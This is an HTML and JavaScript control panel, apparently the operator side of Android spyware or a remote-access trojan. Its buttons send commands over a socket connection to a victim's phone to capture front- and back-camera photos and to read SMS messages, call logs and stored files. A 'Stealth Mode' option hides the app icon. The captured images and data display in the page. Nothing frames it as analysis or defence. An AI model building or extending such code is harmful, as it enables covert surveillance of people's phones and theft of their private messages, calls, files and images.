<!DOCTYPE html>
<html>
<head>
    <title>Monitor Dashboard</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 20px; }
        .box { background: #2a2a2a; border-radius: 10px; padding: 15px; border: 1px solid #444; }
        button { background: #007bff; color: white; border: none; padding: 10px; margin: 5px; cursor: pointer; border-radius: 5px; }
        button:hover { background: #0056b3; }
        #log-area { text-align: left; height: 200px; overflow-y: scroll; background: black; padding: 10px; font-family: monospace; font-size: 12px; }
        img { max-width: 100%; border: 2px solid #00ff00; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>System Control Panel</h1>
    <div id="status" style="background:orange; padding:5px;">Connecting...</div>

    <div class="grid">
        <div class="box">
            <h3>Camera & Audio</h3>
            <button onclick="sendCmd('camera-back')">ğŸ“¸ Back Camera</button>
            <button onclick="sendCmd('camera-front')">ğŸ“¸ Front Camera</button>
            <div id="image-container"></div>
        </div>

        <div class="box">
            <h3>Phone Data</h3>
            <button onclick="sendCmd('get-sms')">ğŸ“© Read SMS</button>
            <button onclick="sendCmd('get-calls')">ğŸ“ Call Logs</button>
            <button onclick="sendCmd('get-files')">ğŸ“ Files</button>
            <h3>Stealth Mode</h3>
    <button onclick="sendCmd('hide-icon')" style="background: #dc3545;">ğŸ‘» Hide Icon</button>
    <button onclick="sendCmd('show-icon')" style="background: #28a745;">ğŸ‘ï¸ Show Icon</button>
            <div id="log-area">Logs will appear here...</div>
        </div>
    </div>

    <script>
        const socket = io();
        const logArea = document.getElementById('log-area');

        function sendCmd(cmd) {
            socket.emit('phone-execute', cmd);
            logArea.innerHTML += `> Sent: ${cmd}<br>`;
        }

        socket.on('connect', () => {
            document.getElementById('status').style.background = "green";
            document.getElementById('status').innerText = "âœ… Connected to Server";
        });

        // Listen for Image Stream
        socket.on('data-stream', (base64) => {
            document.getElementById('image-container').innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
        });

        // Listen for SMS, Calls, and Files
        socket.on('sms-data', (data) => {
            logArea.innerHTML = "<b>--- SMS INBOX ---</b><br>" + data;
        });

        socket.on('call-data', (data) => {
            logArea.innerHTML = "<b>--- RECENT CALLS ---</b><br>" + data;
        });

        socket.on('file-data', (data) => {
            logArea.innerHTML = "<b>--- STORAGE FILES ---</b><br>" + data;
        });
    </script>
</body>
</html>

